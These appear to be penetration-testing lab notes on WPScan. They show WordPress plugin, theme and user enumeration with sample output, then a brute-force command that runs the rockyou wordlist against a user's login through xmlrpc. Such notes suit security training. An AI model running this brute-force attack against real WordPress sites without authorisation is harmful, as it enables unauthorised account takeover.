
[WPScan](https://github.com/wpscanteam/wpscan) is an automated WordPress scanner and enumeration tool. It determines if the various themes and plugins used by a WordPress site are outdated or vulnerable.

WPScan can pull in vulnerability information from external sources to enhance our scans. We can obtain an API token from [WPVulnDB](https://wpvulndb.com/) free plan allows up to 50 requests per day.

The `--enumerate` flag is used to enumerate various components of the WordPress application such as plugins, themes, and users. By default, WPScan enumerates vulnerable plugins, themes, users, media, and backups.

```
Note: The default number of threads used is 5, however, this value can be changed using the "-t" flag.
```

```bash
wpscan --url http://blog.inlanefreight.com --enumerate --api-token Kffr4fdJzy9qVcTk

...<SNIP>...

[+] URL: http://blog.inlanefreight.com/                                                   

[+] Headers                                                                 
|  - Server: Apache/2.4.38 (Debian)
|  - X-Powered-By: PHP/7.3.15
| Found By: Headers (Passive Detection)

[+] XML-RPC seems to be enabled: http://blog.inlanefreight.com/xmlrpc.php
| Found By: Direct Access (Aggressive Detection)
|  - http://codex.wordpress.org/XML-RPC_Pingback_API

...<SNIP>...
```

## WordPress User Bruteforce

After getting username through file read vuln we can enumerate for password. The tool uses two kinds of login brute force attacks, `xmlrpc` and `wp-login`. The `wp-login` method will attempt to brute force the normal WordPress login page, while the `xmlrpc` method uses the WordPress API to make login attempts through `/xmlrpc.php`. The `xmlrpc` method is preferred as it is faster.

```bash
wpscan --password-attack xmlrpc -t 20 -U roger -P /usr/share/wordlists/rockyou.txt --url http://94.237.55.43:31425/
```

